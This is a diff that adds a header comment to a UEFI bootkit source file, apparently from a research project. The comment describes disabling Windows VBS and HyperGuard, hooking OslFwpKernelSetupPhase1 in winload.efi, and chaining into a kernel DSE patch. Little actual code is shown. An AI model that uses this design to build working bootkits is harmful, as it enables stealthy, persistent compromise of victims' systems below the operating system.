@@ -1,3 +1,29 @@
+/*
+ * ============================================================
+ *  Project  : WhiteLotus — UEFI Bootkit DXE Driver
+ *  File     : PatchWinload.c
+ * ============================================================
+ *
+ *  Description:
+ *    Patches winload.efi to disable Virtualization-Based
+ *    Security (VBS) by setting the VbsPolicyDisabled EFI
+ *    variable, then locates OslFwpKernelSetupPhase1 via byte-
+ *    pattern search and installs a trampoline hook. The hook
+ *    fires after the kernel is loaded into memory and triggers
+ *    the ntoskrnl DSE patch before handing off to Windows.
+ *
+ *  Purpose:
+ *    - Chain from winload.efi into the kernel patcher at the
+ *      correct point in the boot sequence.
+ *    - Disable VBS/HyperGuard before kernel initialization.
+ *
+ *  Author   : 0xbekoo
+ *  Blog     : https://0xbekoo.github.io
+ *  Updated  : 2026-05-21
+ *
+ * ============================================================
+ */
+
 #include "PatchWinload.h"
 
 // Kernel patch information structure
